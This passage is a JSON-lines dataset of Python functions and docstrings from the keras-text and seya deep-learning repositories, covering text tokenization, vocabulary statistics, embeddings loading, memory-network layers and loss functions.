header=header,\n                              funcdef=funcdef,\n                              path=path,\n                              doc=doc if doc else \"*No documentation found.*\")\nreturn string", "path": "docs\\md_autogen.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Initializes the markdown api generator.\n\nArgs:\n    src_root: The root folder name containing all the sources.\n        Ex: src\n    github_link: The base github link. Should include branch name.\n        Ex: https://github.com/raghakot/keras-vis/tree/master\n        All source links are generated with this prefix.\n\"\"\"\n", "func_signal": "def __init__(self, src_root, github_link):\n", "code": "self.src_root = src_root\nself.github_link = github_link", "path": "docs\\md_autogen.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Updates counts based on indices. The algorithm tracks the index change at i and\nupdate global counts for all indices beyond i with local counts tracked so far.\n\"\"\"\n# Initialize various lists for the first time based on length of indices.\n", "func_signal": "def update(self, indices):\n", "code": "if self._prev_indices is None:\n    self._prev_indices = indices\n\n    # +1 to track token counts in the last index.\n    self._local_counts = np.full(len(indices) + 1, 1)\n    self._local_counts[-1] = 0\n    self.counts = [[] for _ in range(len(self._local_counts))]\n\nhas_reset = False\nfor i in range(len(indices)):\n    # index value changed. Push all local values beyond i to count and reset those local_counts.\n    # For example, if document index changed, push counts on sentences and tokens and reset their local_counts\n    # to indicate that we are tracking those for new document. We need to do this at all document hierarchies.\n    if indices[i] > self._prev_indices[i]:\n        self._local_counts[i] += 1\n        has_reset = True\n        for j in range(i + 1, len(self.counts)):\n            self.counts[j].append(self._local_counts[j])\n            self._local_counts[j] = 1\n\n# If none of the aux indices changed, update token count.\nif not has_reset:\n    self._local_counts[-1] += 1\nself._prev_indices = indices[:]", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Builds the internal vocabulary and computes various statistics.\n\nArgs:\n    texts: The list of text items to encode.\n    verbose: The verbosity level for progress. Can be 0, 1, 2. (Default value = 1)\n    **kwargs: The kwargs for `token_generator`.\n\"\"\"\n", "func_signal": "def build_vocab(self, texts, verbose=1, **kwargs):\n", "code": "if self.has_vocab:\n    logger.warn(\"Tokenizer already has existing vocabulary. Overriding and building new vocabulary.\")\n\nprogbar = Progbar(len(texts), verbose=verbose, interval=0.25)\ncount_tracker = _CountTracker()\n\nself._token_counts.clear()\nself._num_texts = len(texts)\n\nfor token_data in self.token_generator(texts, **kwargs):\n    indices, token = token_data[:-1], token_data[-1]\n    count_tracker.update(indices)\n    self._token_counts[token] += 1\n\n    # Update progressbar per document level.\n    progbar.update(indices[0])\n\n# Generate token2idx and idx2token.\nself.create_token_indices(self._token_counts.keys())\n\n# All done. Finalize progressbar update and count tracker.\ncount_tracker.finalize()\nself._counts = count_tracker.counts\nprogbar.update(len(texts), force=True)", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Orders the set of `objs` by `line_nos`\n\"\"\"\n", "func_signal": "def order_by_line_nos(objs, line_nos):\n", "code": "ordering = sorted(range(len(line_nos)), key=line_nos.__getitem__)\nreturn [objs[i] for i in ordering]", "path": "docs\\md_autogen.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Numpy array of count values for aux_indices. For example, if `token_generator` generates\n`(text_idx, sentence_idx, word)`, then `get_counts(0)` returns the numpy array of sentence lengths across\ntexts. Similarly, `get_counts(1)` will return the numpy array of token lengths across sentences.\n\nThis is useful to plot histogram or eyeball the distributions. For getting standard statistics, you can use\n`get_stats` method.\n\"\"\"\n", "func_signal": "def get_counts(self, i):\n", "code": "if not self.has_vocab:\n    raise ValueError(\"You need to build the vocabulary using `build_vocab` before using `get_counts`\")\nreturn self._counts[i]", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Yields tokens from texts as `(text_idx, character)`\n\"\"\"\n", "func_signal": "def token_generator(self, texts, **kwargs):\n", "code": "for text_idx, text in enumerate(texts):\n    if self.lower:\n        text = text.lower()\n    for char in text:\n        yield text_idx, char", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Encodes the given texts using internal vocabulary with optionally applied encoding options. See\n``apply_encoding_options` to set various options.\n\nArgs:\n    texts: The list of text items to encode.\n    include_oov: True to map unknown (out of vocab) tokens to 0. False to exclude the token.\n    verbose: The verbosity level for progress. Can be 0, 1, 2. (Default value = 1)\n    **kwargs: The kwargs for `token_generator`.\n\nReturns:\n    The encoded texts.\n\"\"\"\n", "func_signal": "def encode_texts(self, texts, include_oov=False, verbose=1, **kwargs):\n", "code": "if not self.has_vocab:\n    raise ValueError(\"You need to build the vocabulary using `build_vocab` before using `encode_texts`\")\n\nprogbar = Progbar(len(texts), verbose=verbose, interval=0.25)\nencoded_texts = []\nfor token_data in self.token_generator(texts, **kwargs):\n    indices, token = token_data[:-1], token_data[-1]\n\n    token_idx = self._token2idx.get(token)\n    if token_idx is None and include_oov:\n        token_idx = 0\n\n    if token_idx is not None:\n        _append(encoded_texts, indices, token_idx)\n\n    # Update progressbar per document level.\n    progbar.update(indices[0])\n\n# All done. Finalize progressbar.\nprogbar.update(len(texts), force=True)\nreturn encoded_texts", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Applies the given settings for subsequent calls to `encode_texts` and `decode_texts`. This allows you to\nplay with different settings without having to re-run tokenization on the entire corpus.\n\nArgs:\n    min_token_count: The minimum token count (frequency) in order to include during encoding. All tokens\n        below this frequency will be encoded to `0` which corresponds to unknown token. (Default value = 1)\n    max_tokens: The maximum number of tokens to keep, based their frequency. Only the most common `max_tokens`\n        tokens will be kept. Set to None to keep everything. (Default value: None)\n\"\"\"\n", "func_signal": "def apply_encoding_options(self, min_token_count=1, max_tokens=None):\n", "code": "if not self.has_vocab:\n    raise ValueError(\"You need to build the vocabulary using `build_vocab` \"\n                     \"before using `apply_encoding_options`\")\nif min_token_count < 1:\n    raise ValueError(\"`min_token_count` should atleast be 1\")\n\n# Remove tokens with freq < min_token_count\ntoken_counts = list(self._token_counts.items())\ntoken_counts = filter(lambda x: x[1] >= min_token_count, token_counts)\n\n# Clip to max_tokens.\nif max_tokens is not None:\n    token_counts.sort(key=lambda x: x[1], reverse=True)\n    filtered_tokens = zip(*token_counts)[0]\n    filtered_tokens = filtered_tokens[:max_tokens]\nelse:\n    filtered_tokens = zip(*token_counts)[0]\n\n# Generate indices based on filtered tokens.\nself.create_token_indices(filtered_tokens)", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Encapsulates all pieces of data to run an experiment. This is basically a bag of items that makes it\neasy to serialize and deserialize everything as a unit.\n\nArgs:\n    inputs: The raw model inputs. This can be set to None if you dont want\n        to serialize this value when you save the dataset.\n    labels: The raw output labels.\n    test_indices: The optional test indices to use. Ideally, this should be generated one time and reused\n        across experiments to make results comparable. `generate_test_indices` can be used generate first\n        time indices.\n    **kwargs: Additional key value items to store.\n\"\"\"\n", "func_signal": "def __init__(self, inputs, labels, test_indices=None, **kwargs):\n", "code": "self.X = np.array(inputs)\nself.y = np.array(labels)\nfor key, value in kwargs.items():\n    setattr(self, key, value)\n\nself._test_indices = None\nself._train_indices = None\nself.test_indices = test_indices\n\nself.is_multi_label = isinstance(labels[0], (set, list, tuple))\nself.label_encoder = MultiLabelBinarizer() if self.is_multi_label else LabelBinarizer()\nself.y = self.label_encoder.fit_transform(self.y).flatten()", "path": "keras_text\\data.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Gets the standard statistics for aux_index `i`. For example, if `token_generator` generates\n`(text_idx, sentence_idx, word)`, then `get_stats(0)` will return various statistics about sentence lengths\nacross texts. Similarly, `get_counts(1)` will return statistics of token lengths across sentences.\n\nThis information can be used to pad or truncate inputs.\n\"\"\"\n# OrderedDict to always show same order if printed.\n", "func_signal": "def get_stats(self, i):\n", "code": "result = OrderedDict()\nresult['min'] = np.min(self._counts[i])\nresult['max'] = np.max(self._counts[i])\nresult['std'] = np.std(self._counts[i])\nresult['mean'] = np.mean(self._counts[i])\nreturn result", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Parse docstring (parsed with getdoc) according to Google-style\nformatting and convert to markdown. We support the following\nGoogle style syntax:\n\nArgs, Kwargs:\n    argname (type): text\n    freeform text\nReturns, Yields:\n    retname (type): text\n    freeform text\nRaises:\n    exceptiontype: text\n    freeform text\nNotes, Examples:\n    freeform text\n\n\"\"\"\n", "func_signal": "def doc2md(self, func):\n", "code": "doc = getdoc(func) or \"\"\nblockindent = 0\nargindent = 1\nout = []\n\nfor line in doc.split(\"\\n\"):\n    indent = len(line) - len(line.lstrip())\n    line = line.lstrip()\n    if _RE_BLOCKSTART.match(line):\n        # start of a new block\n        blockindent = indent\n        out.append(\"\\n*{}*\\n\".format(line))\n    elif indent > blockindent:\n        if _RE_ARGSTART.match(line):\n            # start of new argument\n            out.append(\"\\n\" + \" \" * blockindent + \" - \" + _RE_ARGSTART.sub(r\"**\\1** (\\2): \\3\", line))\n            argindent = indent\n        elif _RE_EXCSTART.match(line):\n            # start of an exception-type block\n            out.append(\"\\n\" + \" \" * blockindent + \" - \" + _RE_EXCSTART.sub(r\"**\\1**: \\2\", line))\n            argindent = indent\n        elif indent > argindent:\n            out.append(\"\\n\" + \" \" * (blockindent + 2) + line)\n        else:\n            out.append(\"\\n\" + line)\n    else:\n        out.append(\"\\n\" + line)\n\nreturn \"\".join(out)", "path": "docs\\md_autogen.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Retrieves embeddings index from embedding name. Will automatically download and cache as needed.\n\nArgs:\n    embedding_type: The embedding type to load.\n\nReturns:\n    The embeddings indexed by word.\n\"\"\"\n\n", "func_signal": "def get_embeddings_index(embedding_type='glove.42B.300d'):\n", "code": "embeddings_index = _EMBEDDINGS_CACHE.get(embedding_type)\nif embeddings_index is not None:\n    return embeddings_index\n\ndata_obj = _EMBEDDING_TYPES.get(embedding_type)\nif data_obj is None:\n    raise ValueError(\"Embedding name should be one of '{}'\".format(_EMBEDDING_TYPES.keys()))\n\ncache_dir = os.path.expanduser(os.path.join('~', '.keras-text'))\nif not os.path.exists(cache_dir):\n    os.makedirs(cache_dir)\n\nfile_path = get_file(embedding_type, origin=data_obj['url'], extract=True,\n                     cache_dir=cache_dir, cache_subdir='embeddings')\nfile_path = os.path.join(os.path.dirname(file_path), data_obj['file'])\n\nembeddings_index = _build_embeddings_index(file_path)\n_EMBEDDINGS_CACHE[embedding_type] = embeddings_index\nreturn embeddings_index", "path": "keras_text\\embeddings.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Applies various filtering and processing options on token.\n\nReturns:\n    The processed token. None if filtered.\n\"\"\"\n# Apply work token filtering.\n", "func_signal": "def _apply_options(self, token):\n", "code": "if token.is_punct and self.remove_punct:\n    return None\nif token.is_stop and self.remove_stop_words:\n    return None\nif token.is_digit and self.remove_digits:\n    return None\nif token.is_oov and self.exclude_oov:\n    return None\nif token.pos_ in self.exclude_pos_tags:\n    return None\nif token.ent_type_ in self.exclude_entities:\n    return None\n\n# Lemmatized ones are already lowered.\nif self.lemmatize:\n    return token.lemma_\nif self.lower:\n    return token.lower_\nreturn token.orth_", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"This will add the very last document to counts. We also get rid of counts[0] since that\nrepresents document level which doesnt come under anything else. We also convert all count\nvalues to numpy arrays so that stats can be computed easily.\n\"\"\"\n", "func_signal": "def finalize(self):\n", "code": "for i in range(1, len(self._local_counts)):\n    self.counts[i].append(self._local_counts[i])\nself.counts.pop(0)\n\nfor i in range(len(self.counts)):\n    self.counts[i] = np.array(self.counts[i])", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "'''Parse stories provided in the bAbi tasks format\nIf only_supporting is true, only the sentences that support the answer are kept.\n'''\n", "func_signal": "def parse_stories(lines, only_supporting=False):\n", "code": "data = []\nstory = []\nfor line in lines:\n    line = line.decode('utf-8').strip()\n    nid, line = line.split(' ', 1)\n    nid = int(nid)\n    if nid == 1:\n        story = []\n    if '\\t' in line:\n        q, a, supporting = line.split('\\t')\n        q = tokenize(q)\n        substory = None\n        if only_supporting:\n            # Only select the related substory\n            supporting = map(int, supporting.split())\n            substory = [story[i - 1] for i in supporting]\n        else:\n            # Provide all the substories\n            substory = [x for x in story if x]\n        data.append((substory, q, a))\n        story.append('')\n    else:\n        sent = tokenize(line)\n        story.append(sent)\nreturn data", "path": "examples\\babi_memn2n.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# shape: (batch*memory_length, input_length)\n", "func_signal": "def lookup(self, x, W, memory_length):\n", "code": "x = K.cast(K.reshape(x, (-1, self.input_length)), 'int32')\nmask = K.expand_dims(K.not_equal(x, 0.), dim=-1)\n# shape: (batch*memory_length, input_length, output_dim)\nX = K.gather(W, x)\nif self.bow_mode == \"bow\":\n    # shape: (batch*memory_length, output_dim)\n    X = K.sum(X + K.expand_dims(self.Te, 0), axis=1)\n# shape: (batch, memory_length, output_dim)\nX = K.reshape(X, (-1, memory_length, self.output_dim))\nreturn X, mask", "path": "seya\\layers\\memnn2.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# list of embedding layers\n", "func_signal": "def build(self):\n", "code": "self.outputs = []\nself.memory = []\n# self.Hs = []  # if self.mode == \"rnn\"\nself.trainable_weights = []\nfor i in range(self.hops):\n    # memory embedding - A\n    if self.mode == \"adjacent\" and i > 0:\n        A = self.outputs[-1]\n    else:\n        A = self.emb_init((self.input_dim, self.output_dim),\n                          name=\"{}_A_{}\".format(self.name, i))\n        self.trainable_weights += [A]\n    self.memory.append(A)\n\n    # outputs embedding - C\n    # if self.mode == \"adjacent\" and i > 1:\n    #    Wo = self.outputs[-1]\n    # elif self.mode == \"untied\" or i == 0:\n    C = self.emb_init((self.input_dim, self.output_dim),\n                      name=\"{}_C_{}\".format(self.name, i))\n    self.trainable_weights += [C]\n    self.outputs.append(C)\n\n    # if self.mode == \"rnn\"\n    # H = self.init((self.output_dim, self.output_dim),\n    #               name=\"{}_H_{}\".format(self.name, i))\n    # self.trainable_weights += [H]\n    # b = K.zeros((self.input_dim,),\n    #             name=\"{}_b_{}\".format(self.name, i))\n    # self.Hs += [H]\n    # self.trainable_weights += [H]\n\nif self.mode == \"adjacent\":\n    self.W = self.outputs[-1].T\n    self.b = K.zeros((self.input_dim,), name=\"{}_b\".format(self.name))\n    # self.trainable_weights += [self.b]\n\n# question embedding - B\nself.B = self.emb_init((self.input_dim, self.output_dim),\n                       name=\"{}_B\".format(self.name))\nself.trainable_weights += [self.B]\n\n# Temporal embedding\nself.Te = self.emb_init((self.input_length, self.output_dim))\nself.trainable_weights += [self.Te]", "path": "seya\\layers\\memnn2.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# Assumes: y_pred = T.concatenate([mean, logsigma], axis=-1)\n", "func_signal": "def gaussianKL(dumb, y_pred):\n", "code": "dim = y_pred.shape[1] / 2\nmean = y_pred[:, :dim]\nlogsigma = y_pred[:, dim:]\n# See Variational Auto-Encoding Bayes by Kingma and Welling.\nkl = -.5 - logsigma + .5 * (mean**2 + K.exp(2 * logsigma))\nreturn K.mean(kl, axis=-1) + 0 * K.sum(dumb)", "path": "seya\\objectives.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "'''Given a file name, read the file, retrieve the stories, and then convert the sentences into a single story.\nIf max_length is supplied, any stories longer than max_length tokens will be discarded.\n'''\n", "func_signal": "def get_stories(f, only_supporting=False, max_length=None):\n", "code": "data = parse_stories(f.readlines(), only_supporting=only_supporting)\nreturn data", "path": "examples\\babi_memn2n.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"Check if batched dot works\"\"\"\n", "func_signal": "def test_batched_dot(self):\n", "code": "samples = 8\nxdim = 7\nsizes_list = [10, 5]\nX = K.placeholder(ndim=2)\nW1 = K.placeholder(ndim=2)\nW2 = K.placeholder(ndim=2)\nB1 = K.placeholder(ndim=1)\nB2 = K.placeholder(ndim=1)\nY = utils.batched_dot(X, [W1, W2], [B1, B2], sizes_list)\nF = K.function([X, W1, W2, B1, B2], Y)\n\nx = np.ones((samples, xdim))\nw1 = np.ones((xdim, sizes_list[0])).astype('float32')\nw2 = np.ones((xdim, sizes_list[1])).astype('float32')\nb1 = np.ones(sizes_list[0]).astype('float32')\nb2 = np.ones(sizes_list[1]).astype('float32')\ny = F([x, w1, w2, b1, b2])\nprint(x.dot(w2)+b2, y[1])\nprint(y[0], x.dot(w1)+b1)\n#assert np.testing.assert_allclose(y[0], x.dot(w1)+b1, rtol=1e-3)\n#assert np.testing.assert_allclose(y[1], x.dot(w2)+b2, rtol=1e-3)", "path": "tests\\test_utils.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"We have to update the inner RNN inside the NTM, this\nis the function to do it. Pretty much copy+pasta from Keras\n\"\"\"\n", "func_signal": "def _update_controller(self, inp, h_tm1, M):\n", "code": "x = T.concatenate([inp, M], axis=-1)\n#1 is for gru, 2 is for lstm\nif len(h_tm1) in [1,2]:\n    if hasattr(self.rnn,\"get_constants\"):\n        BW,BU = self.rnn.get_constants(x)\n        h_tm1 += (BW,BU)\n# update state\n_, h = self.rnn.step(x, h_tm1)\n\nreturn h", "path": "seya\\layers\\ntm.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "'''Picks a single value in time from a recurrent layer\n   without forgeting its input mask'''\n", "func_signal": "def __init__(self, time=-1):\n", "code": "super(TimePicker, self).__init__()\nself.time = time\nself.input = T.tensor3()", "path": "seya\\layers\\base.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"Just check that the Bidirectional layer can compile and run\"\"\"\n", "func_signal": "def test_basic(self):\n", "code": "nb_samples, timesteps, input_dim, output_dim = 3, 3, 10, 5\n\nfor ret_seq in [True, False]:\n    rnn1 = SimpleRNN(output_dim, return_sequences=ret_seq,\n                     input_shape=(None, input_dim))\n    rnn2 = SimpleRNN(output_dim, return_sequences=ret_seq,\n                     input_shape=(None, input_dim))\n    layer = Bidirectional(rnn1, rnn2, return_sequences=ret_seq)\n    layer.input = theano.shared(value=np.ones((nb_samples, timesteps, input_dim)))\n    rnn1.input = layer.input\n    rnn2.input = layer.input\n    _ = layer.get_config()\n\n    for train in [True, False]:\n        out = layer.get_output(train).eval()\n        # Make sure the output has the desired shape\n        if ret_seq:\n            assert(out.shape == (nb_samples, timesteps, output_dim*2))\n        else:\n            assert(out.shape == (nb_samples, output_dim*2))\n        _ = layer.get_output_mask(train)", "path": "tests\\test_recurrent.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"\nThis method is for research and visualization purposes. Use it as\nX = model.get_input()  # full model\nY = ntm.get_output()    # this layer\nF = theano.function([X], Y, allow_input_downcast=True)\n[memory, read_address, write_address, rnn_state] = F(x)\n\nif inner_rnn == \"lstm\" use it as\n[memory, read_address, write_address, rnn_cell, rnn_state] = F(x)\n\n\"\"\"\n# input shape: (nb_samples, time (padded with zeros), input_dim)\n", "func_signal": "def get_full_output(self, train=False):\n", "code": "X = self.get_input(train)\nassert K.ndim(X) == 3\nif K._BACKEND == 'tensorflow':\n    if not self.input_shape[1]:\n        raise Exception('When using TensorFlow, you should define ' +\n                        'explicitely the number of timesteps of ' +\n                        'your sequences. Make sure the first layer ' +\n                        'has a \"batch_input_shape\" argument ' +\n                        'including the samples axis.')\n\nmask = self.get_output_mask(train)\nif mask:\n    # apply mask\n    X *= K.cast(K.expand_dims(mask), X.dtype)\n    masking = True\nelse:\n    masking = False\n\nif self.stateful:\n    initial_states = self.states\nelse:\n    initial_states = self.get_initial_states(X)\n\nstates = rnn_states(self.step, X, initial_states,\n                    go_backwards=self.go_backwards,\n                    masking=masking)\nreturn states", "path": "seya\\layers\\ntm.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# mask original shape is (batch*memory_length, input_length, 1)\n# shape (batch, memory)\n", "func_signal": "def attention(self, m, q, mask):\n", "code": "mask = K.reshape(mask[:, 0], (-1, self.memory_length))\n# shape: (batch, memory_length, 1)\np = T.batched_tensordot(m, q, (2, 2))\n# shape: (batch, memory_length)\np = K.softmax(p[:, :, 0])  # * K.cast(mask, 'float32')\n# shape: (batch, 1, memory_length)\nreturn K.expand_dims(p, dim=1)", "path": "seya\\layers\\memnn2.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"\nYann LeCun's local contrast normalization\nOrginal code in Theano by: Guillaume Desjardins\n\"\"\"\n\n", "func_signal": "def lecun_lcn(self, X, kernel_size=7, threshold=1e-4, use_divisor=True):\n", "code": "filter_shape = (1, 1, kernel_size, kernel_size)\nfilters = self.gaussian_filter(\n    kernel_size).reshape(filter_shape)\n# filters = shared(_asarray(filters, dtype=floatX), borrow=True)\nfilters = K.variable(filters)\n\nconvout = K.conv2d(X, filters, filter_shape=filter_shape,\n                   border_mode='same')\n\n# For each pixel, remove mean of kernel_sizexkernel_size neighborhood\nnew_X = X - convout\n\nif use_divisor:\n    # Scale down norm of kernel_sizexkernel_size patch\n    sum_sqr_XX = K.conv2d(K.pow(K.abs(new_X), 2), filters,\n                          filter_shape=filter_shape, border_mode='same')\n\n    denom = T.sqrt(sum_sqr_XX)\n    per_img_mean = denom.mean(axis=[2, 3])\n    divisor = T.largest(per_img_mean.dimshuffle(0, 1, 'x', 'x'), denom)\n    divisor = T.maximum(divisor, threshold)\n\n    new_X /= divisor\n\nreturn new_X", "path": "seya\\layers\\imageproc.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# shape: (batch, memory_length, 1)\n", "func_signal": "def calc_output(self, c, p):\n", "code": "p = K.permute_dimensions(p, (0, 2, 1))\n# shape: (batch, output_dim)\no = K.sum(c * p, axis=1)\n# if self.mode == \"rnn\":\n# import theano\n# W = theano.printing.Print('[Debug] W shape: ', attrs=(\"shape\",))(W)\n# o = K.dot(o, W) + b\n# shape: (batch, 1, output_dim)\nreturn K.expand_dims(o, dim=1)", "path": "seya\\layers\\memnn2.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"Image gradient difference loss for videos\n\nimg_shape: (time, channels, rows, cols) shape to resize the input\n    vectors, we assume they are input flattened in the spatial dimensions.\nalpha: l_alpha norm\n\nref: Deep Multi-scale video prediction beyond mean square error,\n     by Mathieu et. al.\n\"\"\"\n", "func_signal": "def gdl_video(img_shape, alpha=2):\n", "code": "def func(y_true, y_pred):\n    Y_true = K.reshape(y_true, (-1, ) + img_shape)\n    Y_pred = K.reshape(y_pred, (-1, ) + img_shape)\n    t1 = K.pow(K.abs(Y_true[:, :, :, 1:, :] - Y_true[:, :, :, :-1, :]) -\n               K.abs(Y_pred[:, :, :, 1:, :] - Y_pred[:, :, :, :-1, :]), alpha)\n    t2 = K.pow(K.abs(Y_true[:, :, :, :, :-1] - Y_true[:, :, :, :, 1:]) -\n               K.abs(Y_pred[:, :, :, :, :-1] - Y_pred[:, :, :, :, 1:]), alpha)\n    out = K.mean(K.batch_flatten(t1 + t2), -1)\n    return out\nreturn func", "path": "seya\\objectives.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# list of embedding layers\n", "func_signal": "def build(self):\n", "code": "self.question = []\nself.facts = []\nself.memory = []\nself.Ws = []\nself.trainable_weights = []\nfor i in range(self.hops):\n    q = BagEmbedding(self.input_dim, self.q_nb_words, self.output_dim,\n                     1, bow_mode=self.bow_mode,\n                     mask_zero=self.mask_zero, dropout=self.dropout)\n    q.build()\n    f = BagEmbedding(self.input_dim, self.f_nb_words, self.output_dim,\n                     self.input_length, bow_mode=self.bow_mode,\n                     mask_zero=self.mask_zero, dropout=self.dropout)\n    f.build()\n    m = BagEmbedding(self.input_dim, self.f_nb_words, self.output_dim,\n                     self.input_length, bow_mode=self.bow_mode,\n                     mask_zero=self.mask_zero, dropout=self.dropout)\n    m.build()\n    self.question.append(q)\n    self.facts.append(f)\n    self.memory.append(m)\n    if i == self.hops-1:\n        w = Dense(self.output_dim, input_dim=self.output_dim,\n                  activation=self.activation)\n    else:\n        w = Dense(self.output_dim, input_dim=self.output_dim,\n                  activation=self.inner_activation)\n    w.build()\n    self.Ws.append(w)\n    for l in (q, f, m, w):\n        self.trainable_weights += l.trainable_weights", "path": "seya\\layers\\memnn.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"Image gradient difference loss\n\nimg_shape: (channels, rows, cols) shape to resize the input\n    vectors, we assume they are input flattened in the spatial dimensions.\nalpha: l_alpha norm\n\nref: Deep Multi-scale video prediction beyond mean square error,\n     by Mathieu et. al.\n\"\"\"\n", "func_signal": "def gdl(img_shape, alpha=2):\n", "code": "def func(y_true, y_pred):\n    y_true = K.batch_flatten(y_true)\n    y_pred = K.batch_flatten(y_pred)\n    Y_true = K.reshape(y_true, (-1, ) + img_shape)\n    Y_pred = K.reshape(y_pred, (-1, ) + img_shape)\n    t1 = K.pow(K.abs(Y_true[:, :, 1:, :] - Y_true[:, :, :-1, :]) -\n               K.abs(Y_pred[:, :, 1:, :] - Y_pred[:, :, :-1, :]), alpha)\n    t2 = K.pow(K.abs(Y_true[:, :, :, :-1] - Y_true[:, :, :, 1:]) -\n               K.abs(Y_pred[:, :, :, :-1] - Y_pred[:, :, :, 1:]), alpha)\n    out = K.mean(K.batch_flatten(t1 + t2), -1)\n    return out\nreturn func", "path": "seya\\objectives.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"We have to update the inner RNN inside the NTM, this\nis the function to do it. Pretty much copy+pasta from Keras\n\"\"\"\n\n#1 is for gru, 2 is for lstm\n", "func_signal": "def _update_controller(self, inp , h_tm1):\n", "code": "if len(h_tm1) in [1,2]:\n    if hasattr(self.rnn,\"get_constants\"):\n        BW,BU = self.rnn.get_constants(inp)\n        h_tm1 += (BW,BU)\n# update state\n        \nop_t, h = self.rnn.step(inp, h_tm1)\n \nreturn op_t  , h", "path": "seya\\layers\\stack.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# if K._BACKEND == 'theano':\n#     batch_size = None\n# else:\n#     batch_size = self.batch_size\n", "func_signal": "def build(self):\n", "code": "input_shape = self.input_shape\nself.input = K.placeholder(shape=(None, input_shape[1],\n                                  input_shape[2]))\nself.model.build()\nself.trainable_weights = self.model.trainable_weights", "path": "seya\\layers\\conv_rnn.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "# print('--- {}'.format(args))\n", "func_signal": "def _step(self, *args):\n", "code": "local_outputs = OrderedDict()\nfor k, node in self.nodes.items():\n    # print('This is node {}'.format(k))\n    local_inputs = []\n    for inp in node.input_names:\n        # print('>>> input {}'.format(inp))\n        if inp in self.input_order:\n            idx = self.input_order.index(inp)\n            local_inputs.append(args[idx])\n            # print('iii idx: {}'.format(idx))\n        elif inp in local_outputs:\n            # print('??? output {}'.format(inp))\n            local_inputs.append(local_outputs[inp])\n        elif inp in node.input_list:  # state input\n            idx = len(self.input_order) + self.state_order.index(inp)\n            # print('!!! state {0}, idx {1}'.format(inp, idx))\n            local_inputs.append(args[idx])\n    local_inputs = [x for x in local_inputs if x != []]\n    # print(local_inputs)\n    if len(local_inputs) > 1:\n        if node.merge_mode == 'concat':\n            inputs = T.concatenate(local_inputs, axis=-1)\n        elif node.merge_mode == 'sum':\n            inputs = sum(local_inputs)\n    else:\n        inputs = local_inputs[0]\n    # print('After concat {}'.format(inputs))\n    local_outputs[k] = apply_layer(node, inputs)\n    # print('local outputs: {}'.format(local_outputs))\n\n# print('+++ {}'.format(local_outputs.values()))\nout_vals = []\nfor k, v in local_outputs.items():\n    # print('key: {}'.format(k))\n    out_vals.append(v)\n# return local_outputs.values()\nreturn out_vals", "path": "seya\\layers\\containers.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
